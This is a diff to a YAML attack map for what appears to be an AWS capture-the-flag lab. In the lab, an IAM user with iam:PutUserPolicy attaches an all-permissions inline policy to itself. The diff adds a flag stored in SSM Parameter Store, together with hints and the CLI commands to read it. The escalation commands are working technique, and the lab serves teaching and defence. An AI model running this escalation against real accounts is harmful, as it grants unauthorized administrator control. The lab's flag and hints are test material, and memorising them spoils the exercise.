@@ -4,7 +4,7 @@ attackMap:
       label: "Starting User"
       type: principal
       subType: iam-user
-      isTarget: true
+      isAdmin: true
       arn: "arn:aws:iam::{account_id}:user/pl-prod-iam-007-to-admin-starting-user"
       access:
         type: assumed-breach-credentials
@@ -19,6 +19,13 @@ attackMap:
         This IAM user has iam:PutUserPolicy permission scoped to *, which allows it to
         attach an inline policy to itself and immediately escalate to full administrator
         access without needing to touch any other principal.
+
+    - id: ctf-flag
+      label: "CTF Flag"
+      type: resource
+      subType: ssm-parameter
+      isTarget: true
+      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/iam-007-to-admin"
 
   edges:
     - from: starting-user
@@ -45,3 +52,17 @@ attackMap:
             --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
         - description: "Verify administrator access"
           command: "aws iam list-users"
+    - from: starting-user
+      to: ctf-flag
+      label: "Read CTF flag"
+      description: >
+        With effective AdministratorAccess now attached via the inline policy, read the CTF flag
+        from SSM Parameter Store. The ssm:GetParameter permission is included in AdministratorAccess
+        and the parameter path follows the standard /pathfinding-labs/flags/ convention.
+      hints:
+        - "You now have AdministratorAccess — which includes ssm:GetParameter on all resources."
+        - "The flag lives in SSM Parameter Store under /pathfinding-labs/flags/ with the scenario ID in the path."
+        - "Use aws ssm get-parameter with --query 'Parameter.Value' --output text to print just the flag value."
+      commands:
+        - description: "Read the CTF flag from SSM Parameter Store"
+          command: "aws ssm get-parameter --name /pathfinding-labs/flags/iam-007-to-admin --query 'Parameter.Value' --output text"
